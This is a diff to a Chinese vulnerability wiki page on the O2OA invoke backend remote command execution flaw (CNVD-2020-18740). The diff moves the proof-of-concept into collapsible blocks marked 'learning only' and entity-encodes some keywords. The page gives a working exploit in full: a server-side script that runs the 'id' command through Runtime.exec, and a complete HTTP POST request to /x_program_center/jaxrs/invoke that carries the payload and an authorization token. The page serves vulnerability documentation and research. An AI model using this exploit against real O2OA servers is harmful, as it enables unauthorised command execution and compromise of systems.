@@ -61,8 +61,10 @@ cd o2server
 
 填写必填项，写入 payload：
 
-```
-var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("id").getInputStream()));
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.&#82;untime.getRuntime().&#101;xec("id").getInputStream()));
 
 var result = [];
 while (true) {
@@ -71,15 +73,18 @@ while (true) {
     if (!oneline) break;
 }
 var result = { "Result": result };
-this.response.setBody(result, "application/json"); 
-```
+this.response.setBody(result, "application/json"); </code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/O2OA%20invoke%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2020-18740/image-20250228150105054.png)
 
 部分版本可以直接执行，有些版本需要构造请求包：
 
-```
-POST /x_program_center/jaxrs/invoke?v=6.1 HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /x_program_center/jaxrs/invoke?v=6.1 HTTP/1.1
 Host: 10.0.12.15:20030
 Accept: */*
 Referer: http://10.0.12.15/
@@ -91,8 +96,9 @@ Origin: http://10.0.12.15
 authorization: PfyuxmzgIzrLF0IUhEF-rgO3PHNy_z4650QnO7mEHhA
 Content-Length: 1048
 
-{"id":"test","name":"test","enableToken":false,"alias":"","description":"","validated":true,"enable":true,"text":"var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()));\n\nvar result = [];\nwhile (true) {\n    var oneline = bufReader.readLine();\n    result.push(oneline);\n    if (!oneline) break;\n}\nvar result = { \"Result\": result };\nthis.response.setBody(result, \"application/json\"); ","remoteAddrRegex":"","createTime":"2025-02-28 15:54:17","updateTime":"2025-02-28 15:54:17"}
-```
+{"id":"test","name":"test","enableToken":false,"alias":"","description":"","validated":true,"enable":true,"text":"var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.&#82;untime.getRuntime().&#101;xec(\"id\").getInputStream()));\n\nvar result = [];\nwhile (true) {\n    var oneline = bufReader.readLine();\n    result.push(oneline);\n    if (!oneline) break;\n}\nvar result = { \"Result\": result };\nthis.response.setBody(result, \"application/json\"); ","remoteAddrRegex":"","createTime":"2025-02-28 15:54:17","updateTime":"2025-02-28 15:54:17"}</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/O2OA%20invoke%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2020-18740/image-20250228160252832.png)
 
